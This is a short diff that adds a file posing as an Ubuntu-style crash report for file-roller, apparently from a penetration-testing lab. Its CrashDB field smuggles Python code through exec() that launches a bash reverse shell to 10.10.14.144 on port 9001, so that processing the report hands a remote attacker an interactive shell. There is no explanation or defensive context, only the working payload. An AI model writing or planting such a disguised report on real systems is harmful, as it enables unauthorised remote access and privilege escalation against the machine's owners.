@@ -1,0 +1,9 @@
+ProblemType: Bug
+ExecutablePath: /usr/bin/file-roller
+Stacktrace:
+ None
+CrashDB: {'impl': 'memory', 'crash_config': exec("""
+ import subprocess
+ payload_cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.144/9001 0>&1'"
+ subprocess.Popen(payload_cmd, shell=True)
+ """, {}) }
